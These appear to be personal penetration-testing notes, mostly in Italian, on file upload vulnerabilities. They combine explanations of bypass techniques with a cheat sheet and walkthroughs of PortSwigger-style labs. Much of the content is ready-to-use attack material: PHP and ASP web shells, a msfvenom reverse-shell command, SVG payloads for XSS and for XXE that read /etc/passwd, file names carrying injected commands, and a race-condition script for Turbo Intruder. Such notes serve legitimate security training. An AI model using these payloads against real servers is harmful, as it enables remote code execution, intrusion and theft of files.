
```
## File Upload Vulnerabilities 

Le vulnerabilità nel caricamento di file si verificano quando un server Web consente agli utenti di caricare file nel proprio file system senza convalidare sufficientemente elementi come il nome, il tipo, il contenuto o la dimensione. La mancata applicazione adeguata delle restrizioni su questi potrebbe significare che anche una funzione di caricamento di immagini di base può essere utilizzata per caricare invece file arbitrari e potenzialmente pericolosi. Ciò potrebbe includere anche file di script lato server che consentono l'esecuzione di codice remoto.

In alcuni casi, l'atto di caricare il file è di per sé sufficiente a causare danni. Altri attacchi possono comportare una successiva richiesta HTTP per il file, in genere per attivarne l'esecuzione da parte del server. 


#. MIME-Type:
Multipurpose Internet Mail Extensions (MIME)è uno standard Internet che determina il tipo di un file attraverso il suo formato generale e la struttura dei byte. 
Solitamente i primi byte del file contengono la firma del file.
In Linux il comando file, cerca il MIME del file
> echo "this is a text file" > text.jpg  
> file text.jpg 
[text.jpg: ASCII text]
E' ASCI text nonostante sia text.jpg perchè il il File utilizza il MIME analizzando il formato dei byte del file, e non l'estensione.


 

 



#1. Sfruttare la convalida errata dei caricamenti di file:
Solitamente i dati vengono inviati tramite POST e contenuto "application/x-www-form-url-encoded"  o "multipart/form-data".
Content-Disposition: Fornisce delle informazioni di base sul campo di input a cui si riferisce (es. form-data), possono contenere un "Content-Type" (es. image/jpeg) che indica al server il tipo MIME dei dati inviati utilizzando questo input.
Solitamente il server verifica che il tipo MIME inserito nel Content-Type sia quello atteso. (es. permette solo image/jpeg o image/png).



Es.
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--



#2. Impedire l'esecuzione di file nelle directory accessibili all'utente
Per precauzione, i server generalmente eseguono solo script il cui tipo MIME sono stati esplicitamente configurati per l'esecuzione.
Si può aggirare tale sistema andando a modificare il `filename` campo nelle multipart/form-dat richieste per determinare il nome e la posizione in cui salvare il file.



#3. Bypassing estensioni file pericolosi.
Solitamente lato server vengono impediti di caricare alcune tipologie specifiche di file (es. php, php3, etc).
Si può aggirare questo filtro utilizzando estensioni di file alternative (es. php7, .shtml).
Oppure è possibile la configurazione del server sulle estensioni dei file permesse andando a modificare direttamente il file (es. Apache /etc/apache2/apache2.conf)
Es. Apache - Php:
LoadModule php_module /usr/lib/apache2/modules/libphp.so 
AddType application/x-httpd-php .php

Es. Apache2 - /etc/apache2/mods-enabled/php7.4.confserver
Ad esempio, il /etc/apache2/mods-enabled/php7.4.confserver Apache2 web può includere la seguente configurazione: 
Codice: xml 

<FilesMatch ".+\.ph(ar|p|tml)"> 
  SetHandler application/x-httpd-php
</FilesMatch> 

La configurazione di cui sopra è il modo in cui il server web determina quali file consentire l'esecuzione del codice PHP. Specifica una whitelist con un modello regex che corrisponde a .phar, .phpe .phtml 
Pertanto sarà consentita l'esecuzione Ad esempio, il nome del file ( shell.php.jpg)



Oppure è possibile creare delle configurazioni speciaili all'interno di singole directory per sovrascrivere impostazioni globali, e caricare il nuovo file di confiugrazione dannoso.
Es. Apache utilizza ".htaccess" o Es. IIS "web.config"


#4. Estensioni di file offuscate
E' possibile offuscare l'estensione del file, rendendolo convalidabile.
Es. exploit.pHp, exploit.php.jpg




#5. Convalida errata del contenuto del file:
E' possibile che i server non si fidano tel tipo del contenuto del file utilizzando il "Content-Type", pertanto provano a dedurre se può trattarsi di un'immagine analizzando la sequenza specifica di byte nell'intestazione o nel piè di pagina.
File JPEG iniziano sempre con byte FF D8 FF.
E' quindi possibile tramite tools come ExifTool, creare un file JPEG poliglotta contenente codice dannoso all'interno dei suoi metadati.


#6. Sfruttare Race Condition:
E' possibile che durante la convalida del file, il file venga comunque caricato da qualche parte o viene creata una copia locale prima di eseguire la convalida.
Poichè il file viene caricato tramite HTTP, è possibile che temporaneamente sia possibile richiamare quel file.
Per rendere piu semplici questi attacchi, si può creare un file con il payload dannoso nella parte iniziale, seguito da un gran numbero di byte di riempimento arbitrari, che permettono di recuperare tempo per effettuare l'attacco (il server cercherà di elaborare tutto il file), e verificare anche in base al tempo richiesto dall'upload se effettivamente il file viene inspezionato.

#7. Sfruttare Tipologie specifiche di file 
E' possibile sfruttare tipologie specifiche di file come:
- .HTML, .JS, .SVG, .GIF, .JPG - File dannosi lato client per inserire XSS archiviati
- .XLS, .XML, .SVG, .PDF, .PPT, .DOC: Il server analizza file basati su XML (.doc, xls) XXE Injection.
- ZIP, JPG, PNG: DoS

Es. File Upload - XSS with .JPG
> Exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg

or RCE:
GIF8 
<?php system($_REQUEST[cmd]); ? > 


SVG - XSS:
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> 
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"> 
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" /> 
    <script type="text/javascript">alert(window.origin);</script> 
</svg>


SVG - XXE:
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<svg>&xxe;</svg>

SVG - XXE per leggere il codice sorgente delle applicazione.:
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]> 
<svg>&xxe;</svg>


#8. Caricamento di file utilizzando PUT:
Alcuni server potrbebero essere configurati per supportare PUT le richieste, che potrebbe essere un mezzo alternativo per caricare file dannosi.
Puoi testare il supporto alla PUT inviando OPTIONS request.
Magari bruteforci tutte le richieste fin ora effettuate con OPTIONS ed inserendo il filtro match grep con PUT.

PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>



#9. Command Injection in the Name File:
> file$(whoami).jpg 
> file`whoami`.jpg
> file.jpg||whoami 

> Nome file per sfruttare script XSS: 
<script>alert(window.origin);</script> 
 
> SQL Injection: 
file';select+sleep(5);--.jpg 




#10. Windows - IIS Tilde:
Windows: 
Ad esempio, per fare riferimento a un file chiamato ( hackthebox.txt) possiamo usare ( HAC~1.TXT) o ( HAC~2.TXT), dove la cifra rappresenta l'ordine dei file corrispondenti che iniziano con ( HAC). Poiché Windows supporta ancora questa convenzione, possiamo scrivere un file chiamato (ad esempio WEB~.CONF) per sovrascrivere il web.conffile.



```



```
## File Upload - General

#. Leggere Contenuto sul file system tramite file php
<?php echo file_get_contents('/path/to/target/file'); ?>



#. Web Shell Classica:
<?php echo system($_GET['command']); ?>
GET /example/exploit.php?command=id HTTP/1.1



# Web Shell Obfuscation:
exploit.php.jpg
exploit.pHp
exploit.php.
exploit.pHp.
exploit%2Ephp
exploit.php%00.jpg
exploit.php;.jpg
exploit.p.phphp
exploit.phtml
exploit.jpg.php
exploit.php.jpg
exploit.aspx:.jpg
%20, %0a, %00, %0d0a, /, .\, ., …


# Php Web Shell:
https://github.com/Arrexel/phpbash

#. Php Reverse Shell:
https://github.com/pentestmonkey/php-reverse-shell

# PhP Extensions - Fuzzing:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

# ASP Extensions:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP


# Web Extensions:
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt


#. Web/Reverse Shell:
https://github.com/danielmiessler/SecLists/tree/master/Web-Shells








# Caricamento PUT:
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>



###. Clean Sheets

#. Basic PHP File Read:
<?php file_get_contents('/etc/passwd'); ?>	

#. Basic PHP Command Execution:
<?php system('hostname'); ?>

#. Basic PHP Web Shell:
<?php system($_REQUEST['cmd']); ?>

#. Basic ASP Web Shell:
<% eval request('cmd') %>

#. Generate PHP Reverse Shell:
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php




###. List of Content Type

#. Web Content-Types:
https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt

#. Content-Types:
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt

#. File Signatures:
https://en.wikipedia.org/wiki/List_of_file_signatures



###. Upload Specific Type of File:
- .HTML, .JS, .SVG, .GIF - file dannosi lato client per inserire XSS archiviati
- .XLS, .XML, .SVG, .PDF, .PPT, .DOC - XXE/SSRF Injection.
- DoS - ZIP, JPG, PNG

Es. File Upload - XSS with .JPG
> Exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg

or RCE:
GIF8 
<?php system($_REQUEST[cmd]); ? > 


SVG - XSS:
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> 
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"> 
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" /> 
    <script type="text/javascript">alert(window.origin);</script> 
</svg>


SVG - XXE:
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<svg>&xxe;</svg>

SVG - XXE per leggere il codice sorgente delle applicazione.:
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]> 
<svg>&xxe;</svg>





###. Command Injection in the Name File:
> file$(whoami).jpg 
> file`whoami`.jpg
> file.jpg||whoami 

> Nome file per sfruttare script XSS: 
<script>alert(window.origin);</script> 
 
> SQL Injection: 
file';select+sleep(5);--.jpg 

```



```
## File Upload - Apprentice

#1. Lab: Remote code execution via web shell upload
> create file exploit.php
<?php echo file_get_contents('/home/carlos/secret'); ?>
> GET /files/avatars/exploit.php HTTP/1.1




#2. Lab: Web shell upload via Content-Type restriction bypass
> create file exploit.php
<?php echo file_get_contents('/home/carlos/secret'); ?>
> Upload modified Content-Type image/jpeg

```



```
## File Upload - Practitioner

#3. Lab: Web shell upload via path traversal:
> create file exploit.php
<?php echo file_get_contents('/home/carlos/secret'); ?>
Lo script viene caricato, ma la directory in cui viene caricato non ha moduli php abilitati.
> Cambio il filename per includere una directory differente:
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
E' possibile offuscare anche lo / con filename="..%2fexploit.php"
> The file avatars/../exploit.php has been uploaded.
> GET /files/avatars/..%2fexploit.php or GET /files/exploit.php


#4. Lab: Web shell upload via extension blacklist bypass:
> Upload exploit.php but not allowed to upload files with a .php extension.
Modifico allora il file .htaccess per permettere il caricamento dell'estensione .php
> POST /my-account/avatar 
Change the value of the filename parameter to ".htaccess".
Change the value of the Content-Type header to text/plain
Replace the contents of the file (your PHP payload) with the following Apache directive:
"AddType application/x-httpd-php .l33t"
This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already
> Change from exploit.php to exploit.l33t



#5. Lab: Web shell upload via obfuscated file extension:
> Create exploit.php
> Obfuscated file extensions: filename="exploit.php%00.jpg"



#6. Lab: Remote code execution via polyglot web shell upload:
> Server blocks all files that aren't images
> Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata
> exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.
> GET /files/avatars/polyglot.php
>  find the 'START' string somewhere within the binary image data in the response. Between this and the 'END' string
> example: START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END



```


```
## File Upload - Expert

#7. Lab: Web shell upload via race condition
> > create file exploit.php
<?php echo file_get_contents('/home/carlos/secret'); ?>
> Install Turbo Intruder Extension
> POST /my-account/avatar -> Extensions > Turbo Intruder > Send to turbo Intruder
> Copy This Scripts:

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)

\r\n\r\n

> Replace <YOUR-POST-REQUEST> with the entire POST /my-account/avatar
> Replace <YOUR-GET-REQUEST> with the GET /files/avatars/<YOUR-IMAGE>
> If you choose to build the GET request manually, make sure you terminate it properly with a \r\n\r\n sequence. Also remember that Python will preserve any whitespace within a multiline string, so you need to adjust your indentation accordingly to ensure that a valid request is sent.
```


```
## File Upload - HackTheBox

```